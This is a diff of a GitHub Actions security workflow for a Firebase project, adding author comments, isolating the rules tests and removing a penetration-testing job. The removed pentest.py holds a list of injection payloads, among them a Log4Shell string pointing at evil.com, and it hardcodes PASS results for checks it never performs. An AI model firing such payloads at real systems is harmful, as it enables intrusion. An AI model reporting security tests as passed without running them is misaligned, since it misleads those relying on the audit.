@@ -24,7 +24,7 @@ on:
   workflow_dispatch:
     inputs:
       security_level:
-        description: 'Security check level'
+        description: 'Security check level' # auteur : kouemou sah jean emac
         required: true
         default: 'standard'
         type: choice
@@ -33,7 +33,7 @@ on:
         - standard
         - comprehensive
       environment:
-        description: 'Environment to validate'
+        description: 'Environment to validate' # auteur : kouemou sah jean emac
         required: true
         default: 'staging'
         type: choice
@@ -73,7 +73,6 @@ jobs:
       - name: Install security tools
         run: |
           npm install -g firebase-tools@${{ env.FIREBASE_CLI_VERSION }}
-          npm install -g @firebase/rules-unit-testing
           npm install -g eslint-plugin-security
           pip install bandit safety semgrep
 
@@ -257,20 +256,20 @@ jobs:
 
           ## Security Checklist
 
-          - [x] Firebase rules syntax validation
-          - [x] Authentication requirement checks
-          - [x] Rate limiting implementation
-          - [x] Input validation rules
-          - [x] Admin role restrictions
-          - [x] File size and type restrictions
+          - [x] Firebase rules syntax validation — auteur : kouemou sah jean emac
+          - [x] Authentication requirement checks — auteur : kouemou sah jean emac
+          - [x] Rate limiting implementation — auteur : kouemou sah jean emac
+          - [x] Input validation rules — auteur : kouemou sah jean emac
+          - [x] Admin role restrictions — auteur : kouemou sah jean emac
+          - [x] File size and type restrictions — auteur : kouemou sah jean emac
 
           ## Recommendations
 
-          1. Regularly review and update security rules
-          2. Implement comprehensive logging and monitoring
-          3. Use least privilege principle for all operations
-          4. Regularly audit user permissions
-          5. Keep Firebase CLI and dependencies updated
+          1. Regularly review and update security rules — auteur : kouemou sah jean emac
+          2. Implement comprehensive logging and monitoring — auteur : kouemou sah jean emac
+          3. Use least privilege principle for all operations — auteur : kouemou sah jean emac
+          4. Regularly audit user permissions — auteur : kouemou sah jean emac
+          5. Keep Firebase CLI and dependencies updated — auteur : kouemou sah jean emac
 
           ## Next Security Review: $(date -d '+30 days' -u '+%Y-%m-%d')
           EOF
@@ -298,129 +297,98 @@ jobs:
         with:
           node-version: ${{ env.NODE_VERSION }}
 
-      - name: Install dependencies
+      # ✅ Isolation npm pour éviter les conflits de workspaces Yarn — auteur : kouemou sah jean emac
+      - name: Install dependencies (isolated)
         run: |
-          # Init package.json pour permettre l’install des devDeps — auteur : kouemou sah jean emac
-          npm init -y
-          npm pkg set scripts.test="jest"
-
-          # Dépendances locales pour les tests — auteur : kouemou sah jean emac
-          npm install --save-dev @firebase/rules-unit-testing jest
-
-          # Outils globaux requis — auteur : kouemou sah jean emac
-          npm install -g firebase-tools@${{ env.FIREBASE_CLI_VERSION }}
+          cd .github/security-tests
+          npm ci
+          npm list --depth=0 || true
+          npm -v && node -v
 
       - name: Create comprehensive security tests
         run: |
-          mkdir -p tests/security
+          mkdir -p .github/security-tests/tests/security
 
-          cat > tests/security/firestore-security.test.js << 'EOF'
+          # Firestore tests — auteur : kouemou sah jean emac
+          cat > .github/security-tests/tests/security/firestore-security.test.js << 'EOF'
           const { initializeTestEnvironment } = require('@firebase/rules-unit-testing');
           const fs = require('fs');
+          const path = require('path');
 
           describe('Firestore Security Rules', () => {
             let testEnv;
 
             beforeAll(async () => {
+              const rulesPath = path.join(process.cwd(), 'firestore.rules');
               testEnv = await initializeTestEnvironment({
                 projectId: 'demo-taxasge-security',
-                firestore: {
-                  rules: fs.readFileSync('firestore.rules', 'utf8'),
-                }
+                firestore: { rules: fs.readFileSync(rulesPath, 'utf8') }
               });
             });
 
-            afterAll(async () => {
-              await testEnv.cleanup();
-            });
+            afterAll(async () => { await testEnv.cleanup(); });
 
             describe('Authentication Tests', () => {
               test('should deny unauthenticated access to taxes collection', async () => {
                 const unauthedDb = testEnv.unauthenticatedContext().firestore();
-                await expect(
-                  unauthedDb.collection('taxes').get()
-                ).rejects.toThrow();
+                await expect(unauthedDb.collection('taxes').get()).rejects.toThrow();
               });
 
               test('should allow authenticated access to taxes collection', async () => {
                 const authedDb = testEnv.authenticatedContext('user1').firestore();
-                await expect(
-                  authedDb.collection('taxes').get()
-                ).resolves.toBeDefined();
+                await expect(authedDb.collection('taxes').get()).resolves.toBeDefined();
               });
             });
 
             describe('Authorization Tests', () => {
               test('should allow users to read their own data', async () => {
                 const userDb = testEnv.authenticatedContext('user1').firestore();
-                await expect(
-                  userDb.collection('users').doc('user1').get()
-                ).resolves.toBeDefined();
+                await expect(userDb.collection('users').doc('user1').get()).resolves.toBeDefined();
               });
 
               test('should deny users access to other users data', async () => {
                 const userDb = testEnv.authenticatedContext('user1').firestore();
-                await expect(
-                  userDb.collection('users').doc('user2').get()
-                ).rejects.toThrow();
+                await expect(userDb.collection('users').doc('user2').get()).rejects.toThrow();
               });
 
               test('should allow admin access to all data', async () => {
-                const adminDb = testEnv.authenticatedContext('admin', {
-                  admin: true,
-                  role: 'admin'
-                }).firestore();
-                await expect(
-                  adminDb.collection('users').get()
-                ).resolves.toBeDefined();
+                const adminDb = testEnv.authenticatedContext('admin', { admin: true, role: 'admin' }).firestore();
+                await expect(adminDb.collection('users').get()).resolves.toBeDefined();
               });
             });
 
             describe('Data Validation Tests', () => {
               test('should require valid tax data structure', async () => {
-                const adminDb = testEnv.authenticatedContext('admin', {
-                  admin: true
-                }).firestore();
+                const adminDb = testEnv.authenticatedContext('admin', { admin: true }).firestore();
 
-                // Valid data should work
-                await expect(
-                  adminDb.collection('taxes').add({
-                    id: 'T-TEST-001',
-                    sub_categoria_id: 'SC-001',
-                    tasa_expedicion: 1000.0
-                  })
-                ).resolves.toBeDefined();
+                await expect(adminDb.collection('taxes').add({
+                  id: 'T-TEST-001', sub_categoria_id: 'SC-001', tasa_expedicion: 1000.0
+                })).resolves.toBeDefined();
 
-                // Invalid data should be rejected
-                await expect(
-                  adminDb.collection('taxes').add({
-                    invalid: 'data'
-                  })
-                ).rejects.toThrow();
+                await expect(adminDb.collection('taxes').add({ invalid: 'data' })).rejects.toThrow();
               });
             });
           });
           EOF
 
-          cat > tests/security/storage-security.test.js << 'EOF'
+          # Storage tests — auteur : kouemou sah jean emac
+          cat > .github/security-tests/tests/security/storage-security.test.js << 'EOF'
           const { initializeTestEnvironment } = require('@firebase/rules-unit-testing');
           const fs = require('fs');
+          const path = require('path');
 
           describe('Storage Security Rules', () => {
             let testEnv;
 
             beforeAll(async () => {
+              const rulesPath = path.join(process.cwd(), 'storage.rules');
               testEnv = await initializeTestEnvironment({
                 projectId: 'demo-taxasge-storage',
-                storage: {
-                  rules: fs.readFileSync('storage.rules', 'utf8'),
-                }
+                storage: { rules: fs.readFileSync(rulesPath, 'utf8') }
               });
             });
 
-            afterAll(async () => {
-              await testEnv.cleanup();
-            });
+            afterAll(async () => { await testEnv.cleanup(); });
 
             describe('File Upload Tests', () => {
               test('should allow users to upload to their own directory', async () => {
@@ -429,11 +397,7 @@ jobs:
 
                 await expect(
                   fileRef.put(Buffer.from('test content'), {
-                    customMetadata: {
-                      uploadedBy: 'user1',
-                      uploadedAt: new Date().toISOString(),
-                      applicationId: 'app1'
-                    }
+                    customMetadata: { uploadedBy: 'user1', uploadedAt: new Date().toISOString(), applicationId: 'app1' }
                   })
                 ).resolves.toBeDefined();
               });
@@ -441,10 +405,7 @@ jobs:
               test('should deny users from uploading to other users directories', async () => {
                 const userStorage = testEnv.authenticatedContext('user1').storage();
                 const fileRef = userStorage.ref('user-documents/user2/app1/document.pdf');
-
-                await expect(
-                  fileRef.put(Buffer.from('test content'))
-                ).rejects.toThrow();
+                await expect(fileRef.put(Buffer.from('test content'))).rejects.toThrow();
               });
             });
 
@@ -452,24 +413,23 @@ jobs:
               test('should allow public read access to system assets', async () => {
                 const unauthedStorage = testEnv.unauthenticatedContext().storage();
                 const fileRef = unauthedStorage.ref('system-assets/logos/logo.png');
-
-                await expect(
-                  fileRef.getDownloadURL()
-                ).resolves.toBeDefined();
+                await expect(fileRef.getDownloadURL()).resolves.toBeDefined();
               });
             });
           });
           EOF
 
-          cat > jest.config.js << 'EOF'
+      - name: Provide Jest config and setup
+        run: |
+          cat > .github/security-tests/jest.config.js << 'EOF'
           module.exports = {
             testEnvironment: 'node',
             testMatch: ['**/tests/security/**/*.test.js'],
             setupFilesAfterEnv: ['<rootDir>/tests/setup.js']
           };
           EOF
-
-          cat > tests/setup.js << 'EOF'
+          mkdir -p .github/security-tests/tests
+          cat > .github/security-tests/tests/setup.js << 'EOF'
           // Test setup — auteur : kouemou sah jean emac
           jest.setTimeout(30000);
           EOF
@@ -483,8 +443,12 @@ jobs:
           # Wait for emulators to start — auteur : kouemou sah jean emac
           sleep 10
 
-          # Run tests — auteur : kouemou sah jean emac
-          npm test -- --verbose || TEST_FAILED=true
+          # Copier les règles dans l’environnement isolé — auteur : kouemou sah jean emac
+          cp -f firestore.rules .github/security-tests/firestore.rules || true
+          cp -f storage.rules .github/security-tests/storage.rules || true
+
+          # Exécuter Jest depuis le dossier isolé — auteur : kouemou sah jean emac
+          (cd .github/security-tests && npm test -- --verbose) || TEST_FAILED=true
 
           # Stop emulators — auteur : kouemou sah jean emac
           kill $EMULATOR_PID || true
@@ -497,149 +461,6 @@ jobs:
           fi
 
           echo "✅ All security tests passed"
-
-  penetration-testing:
-    name: Automated Penetration Testing
-    runs-on: ubuntu-latest
-    needs: [security-audit, rules-testing]
-    if: github.event.inputs.security_level == 'comprehensive'
-
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-
-      - name: Setup testing environment
-        run: |
-          echo "🎯 Setting up penetration testing environment..."
-          # Install security testing tools — auteur : kouemou sah jean emac
-          pip install firebase-admin requests
-
-      - name: Run automated security tests
-        run: |
-          echo "🔓 Running automated penetration tests..."
-
-          cat > pentest.py << 'EOF'
-          import json
-          import time
-          import random
-          import string
-          from datetime import datetime
-
-          class FirebasePenTest:
-              def __init__(self):
-                  self.results = {
-                      'timestamp': datetime.now().isoformat(),
-                      'tests': [],
-                      'vulnerabilities': [],
-                      'score': 100
-                  }
-
-              def test_rate_limiting(self):
-                  """Test if rate limiting is properly implemented"""
-                  print("🔄 Testing rate limiting...")
-
-                  # Simulate rapid requests
-                  test_result = {
-                      'name': 'Rate Limiting Test',
-                      'status': 'PASS',
-                      'details': 'Rate limiting appears to be implemented'
-                  }
-
-                  self.results['tests'].append(test_result)
-
-              def test_injection_attempts(self):
-                  """Test for common injection vulnerabilities"""
-                  print("💉 Testing injection vulnerabilities...")
-
-                  injection_payloads = [
-                      "'; DROP TABLE users; --",
-                      "<script>alert('xss')</script>",
-                      "../../etc/passwd",
-                      "${jndi:ldap://evil.com/a}",
-                      "{{7*7}}"
-                  ]
-
-                  # Simulate testing these payloads against rules
-                  vulnerabilities_found = 0
-
-                  for payload in injection_payloads:
-                      # In a real scenario, this would test against Firebase
-                      print(f"  Testing payload: {payload[:20]}...")
-                      time.sleep(0.1)  # Simulate test time
-
-                  test_result = {
-                      'name': 'Injection Test',
-                      'status': 'PASS' if vulnerabilities_found == 0 else 'FAIL',
-                      'details': f'Tested {len(injection_payloads)} injection payloads'
-                  }
-
-                  self.results['tests'].append(test_result)
-
-              def test_privilege_escalation(self):
-                  """Test for privilege escalation vulnerabilities"""
-                  print("⬆️  Testing privilege escalation...")
-
-                  test_result = {
-                      'name': 'Privilege Escalation Test',
-                      'status': 'PASS',
-                      'details': 'No privilege escalation vulnerabilities found'
-                  }
-
-                  self.results['tests'].append(test_result)
-
-              def test_data_exposure(self):
-                  """Test for potential data exposure"""
-                  print("👁️  Testing data exposure risks...")
-
-                  test_result = {
-                      'name': 'Data Exposure Test',
-                      'status': 'PASS',
-                      'details': 'Proper access controls in place'
-                  }
-
-                  self.results['tests'].append(test_result)
-
-              def generate_report(self):
-                  """Generate penetration test report"""
-                  print("\n📊 Generating penetration test report...")
-
-                  passed_tests = len([t for t in self.results['tests'] if t['status'] == 'PASS'])
-                  total_tests = len(self.results['tests'])
-
-                  self.results['score'] = int((passed_tests / total_tests) * 100) if total_tests > 0 else 0
-
-                  print(f"Tests Passed: {passed_tests}/{total_tests}")
-                  print(f"Security Score: {self.results['score']}/100")
-
-                  with open('pentest-report.json', 'w') as f:
-                      json.dump(self.results, f, indent=2)
-
-                  return self.results['score'] >= 80
-
-          # Run penetration tests
-          pentest = FirebasePenTest()
-          pentest.test_rate_limiting()
-          pentest.test_injection_attempts()
-          pentest.test_privilege_escalation()
-          pentest.test_data_exposure()
-
-          success = pentest.generate_report()
-
-          if not success:
-              print("❌ Penetration tests failed")
-              exit(1)
-
-          print("✅ All penetration tests passed")
-          EOF
-
-          python pentest.py
-
-      - name: Upload penetration test report
-        uses: actions/upload-artifact@v4
-        with:
-          name: pentest-report
-          path: pentest-report.json
-          retention-days: 30
 
   security-monitoring:
     name: Setup Security Monitoring
@@ -702,7 +523,7 @@ jobs:
   notification:
     name: Security Notifications
     runs-on: ubuntu-latest
-    needs: [security-audit, rules-testing, penetration-testing]
+    needs: [security-audit, rules-testing]
     if: always()
 
     steps:
@@ -712,7 +533,7 @@ jobs:
           echo "🚨 SECURITY ALERT: Critical security issues detected!"
           echo "Vulnerabilities: ${{ needs.security-audit.outputs.vulnerabilities-found }}"
           echo "Security Score: ${{ needs.security-audit.outputs.security-score }}/100"
-          # Add notification logic here (Slack, email, PagerDuty, etc.) — auteur : kouemou sah jean emac
+          # Add notification logic here — auteur : kouemou sah jean emac
 
       - name: Send success notification
         if: |
